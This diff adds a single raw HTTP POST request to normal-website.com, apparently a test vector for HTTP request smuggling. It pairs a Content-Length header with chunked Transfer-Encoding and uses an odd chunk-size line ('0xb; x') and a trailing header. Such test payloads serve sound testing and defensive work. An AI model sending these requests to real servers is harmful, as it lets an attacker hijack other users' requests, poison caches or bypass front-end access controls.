@@ -1,0 +1,11 @@
+POST /search HTTP/1.1
+Host: normal-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 123456
+Transfer-Encoding: chunked
+
+0xb; x
+q=smuggling
+0
+X-Trailing-Header: stuff
+
